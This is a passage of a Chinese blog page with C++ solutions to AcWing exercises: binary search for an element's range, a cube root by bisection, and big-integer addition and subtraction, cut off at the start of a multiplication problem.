style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 个查询。</p><p>对于每个查询，返回一个元素 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的起始位置和终止位置（位置从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始计数）。</p><p>如果数组中不存在该元素，则返回 <code>-1 -1</code>。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，表示数组长度和询问个数。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数（均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \sim 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span> 范围内），表示完整数组。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 行，每行包含一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，表示一个询问元素。</p><p><strong>输出格式</strong></p><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> 行，每行包含两个整数，表示所求元素的起始位置和终止位置。</p><p>如果数组中不存在该元素，则返回 <code>-1 -1</code>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>q</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">1 \le k \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>6 31 2 2 3 3 4345</code></pre><p><strong>输出样例：</strong></p><pre><code>3 45 5-1 -1</code></pre><h3 id="题解-5">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, q;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;q);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;k);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (a[mid] &gt;= k) &#123;</span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (a[l] != k) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;-1 -1\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, l);</span><br><span class="line">      l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[mid] &lt;= k) &#123;</span><br><span class="line">          l = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, l);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-790-数的三次方根"><a href="https://www.acwing.com/problem/content/792/">AcWing 790. 数的三次方根</a></h2><p>给定一个浮点数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，求它的三次方根。</p><p><strong>输入格式</strong></p><p>共一行，包含一个浮点数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共一行，包含一个浮点数，表示问题的解。</p><p>注意，结果保留 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> 位小数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>10000</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>10000</mn></mrow><annotation encoding="application/x-tex">-10000 \le n \le 10000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">10000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1000.00</code></pre><p><strong>输出样例：</strong></p><pre><code>10.000000</code></pre><h3 id="题解-6">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">double</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;n);  <span class="comment">// 必须.lf</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">double</span> l = <span class="number">-100</span>, r = <span class="number">100</span>;  <span class="comment">// double</span></span><br><span class="line">  <span class="comment">// 保留n位小数，一般区间宽度就小于1e-(n+2)</span></span><br><span class="line">  <span class="keyword">while</span> (r - l &gt; <span class="number">1e-8</span>) &#123;</span><br><span class="line">    <span class="type">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (mid * mid * mid &gt;= n) &#123;</span><br><span class="line">      r = mid;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.6lf\n&quot;</span>, l);  <span class="comment">// .6f或.6lf都行</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="高精度">高精度</h1><h2 id="AcWing-791-高精度加法"><a href="https://www.acwing.com/problem/content/793/">AcWing 791. 高精度加法</a></h2><p>给定两个正整数（不含前导 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>），计算它们的和。</p><p><strong>输入格式</strong></p><p>共两行，每行包含一个整数。</p><p><strong>输出格式</strong></p><p>共一行，包含所求的和。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mtext>整数长度</mtext><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le 整数长度 \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">整数长度</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>1223</code></pre><p><strong>输出样例：</strong></p><pre><code>35</code></pre><h3 id="高精度加法">高精度加法</h3><blockquote><p><strong>C++中对于string不能使用 <code>scanf(&quot;%s&quot;, a)</code> 读取</strong>，建议使用 <code>cin</code> 读取或者使用C中 <code>char []</code> 进行替代。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">add</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (A.<span class="built_in">size</span>() &lt; B.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="built_in">add</span>(B, A);</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    t += A[i];</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t += B[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>(t % <span class="number">10</span>);</span><br><span class="line">    t /= <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (t) C.<span class="built_in">push_back</span>(t);</span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;  <span class="comment">// a = &quot;12345&quot;</span></span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);  <span class="comment">// A = [5, 4, 3, 2, 1]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C = <span class="built_in">add</span>(A, B);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-792-高精度减法"><a href="https://www.acwing.com/problem/content/794/">AcWing 792. 高精度减法</a></h2><p>给定两个正整数（不含前导 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>），计算它们的差，计算结果可能为负数。</p><p><strong>输入格式</strong></p><p>共两行，每行包含一个整数。</p><p><strong>输出格式</strong></p><p>共一行，包含所求的差。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mtext>整数长度</mtext><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le 整数长度 \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">整数长度</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>3211</code></pre><p><strong>输出样例：</strong></p><pre><code>21</code></pre><h3 id="高精度减法">高精度减法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (A.<span class="built_in">size</span>() != B.<span class="built_in">size</span>()) <span class="keyword">return</span> A.<span class="built_in">size</span>() &gt; B.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = A.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">if</span> (A[i] != B[i]) <span class="keyword">return</span> A[i] &gt; B[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sub</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;A, vector&lt;<span class="type">int</span>&gt; &amp;B)</span> </span>&#123;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.<span class="built_in">size</span>(); i++) &#123;  <span class="comment">// 从低到高</span></span><br><span class="line">    t = A[i] - t;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; B.<span class="built_in">size</span>()) t -= B[i];</span><br><span class="line">    C.<span class="built_in">push_back</span>((t + <span class="number">10</span>) % <span class="number">10</span>);</span><br><span class="line">    t = (t &lt; <span class="number">0</span>) ? <span class="number">1</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (C.<span class="built_in">size</span>() &gt; <span class="number">1</span> &amp;&amp; C.<span class="built_in">back</span>() == <span class="number">0</span>) C.<span class="built_in">pop_back</span>();  <span class="comment">// &gt;1, 而非&gt;0</span></span><br><span class="line">  <span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string a, b;</span><br><span class="line">  cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; A, B;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = a.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) A.<span class="built_in">push_back</span>(a[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = b.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) B.<span class="built_in">push_back</span>(b[i] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">cmp</span>(A, B)) &#123;</span><br><span class="line">    C = <span class="built_in">sub</span>(A, B);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    C = <span class="built_in">sub</span>(B, A);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = C.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, C[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-793-高精度乘法"><a href="https://www.acwing.com/problem/content/795/">AcWing 793. 高精度乘法</a></h2><p>给定两个非负整数（不含前导 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>） <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>，请你计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>×</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \times B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> 的值。</p><p><strong>输入格式</strong></p><p>共两行，第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord 